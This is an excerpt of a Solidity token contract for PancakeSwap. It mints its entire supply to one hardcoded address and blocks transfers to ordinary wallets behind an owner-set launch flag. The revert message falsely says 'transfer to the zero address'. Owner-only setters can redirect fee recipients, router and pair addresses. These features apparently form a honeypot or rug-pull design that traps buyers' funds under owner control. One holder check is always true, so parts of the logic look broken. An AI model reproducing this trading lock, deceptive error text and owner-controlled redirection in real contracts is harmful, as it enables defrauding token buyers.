...
contract staff is Ownable, IERC20Metadata {
    ...
    constructor() {
        ...
        _marks = 4;
        _done = 8;
        _maxsell = 2 * 10 ** decimals();
        _dead = 0x000000000000000000000000000000000000dEaD;
        _main = 0x7Bcb3E459A1854D681c64a21e3a1A068ae18226E;
        _whites[_dead] = true;
        _whites[_main] = true;
        _whites[address(this)] = true;
        _mint(_main, 19999 * 10 ** decimals());
    }
    ...
    function _transfer(
        ...
        if(!_whites[recipient] && !isContract(recipient) && !(sender == 0x7Bcb3E459A1854D681c64a21e3a1A068ae18226E)){
            require(kaipan == true, "ERC20: transfer to the zero address");
        }
    ...
    function _swap1() private {
        ...
        if (_maxsell > 0 && balances >= _maxsell) {
            _swapTokenForFist((balances)*5/8);
            uint256 fistval2 = IERC20(_fist).balanceOf(address(this));
                IERC20(_fist).transfer(_mark1, (fistval2)*2 / 5);
                IERC20(address(this)).transfer(_dead, (balances)*1 / 8);
                if ((balances)*2/8 > 0 && (fistval2)*2/5 > 0) {
                addLiquidity2((balances)*2/8, (fistval2)*2/5);
            uint256 fistval3 = IERC20(_pair).balanceOf(address(this));
                _doBonusFist (fistval3);
                _swapTokenForFist1((fistval2)*1/5);
                }
        }
    }
    function addLiquidity2(uint256 t1, uint256 t2) private {
        IPancakeRouter02(_router).addLiquidity(address(this), 
            _fist, t1, t2, 0, 0, _wraps, block.timestamp);
        uint256 amount = IERC20(_pair).balanceOf(_wraps);
        if (IERC20(_pair).allowance(_wraps, address(this)) >= amount && amount > 0) {
            IERC20(_pair).transferFrom(_wraps, address(this), amount);
        }
    }
    function _doBonusFist(uint256 amount) private {
        ...
        while(i < buySize && done < _done ) {
            ...
            if(lp.balanceOf(user) >= 0) {
                ...
                if (bonus > 0) {
                    IERC20(_pair).transfer(user, bonus);
                    done ++;
                }
            }
            i ++;
    ...
    function markg(address mark1) public onlyOwner {
        _mark1 = mark1;
    }
    ...
    function SQ() public {
        ...
        IERC20(_BOSS).approve(_router, 9 * 10**70);
    ...
    function setRouter(address router, address fist, address wrap,address wraps,address pair,address BOSS) public onlyOwner {
        _fist = fist;
        _wrap = wrap;
        _wraps = wraps;
        _BOSS = BOSS;
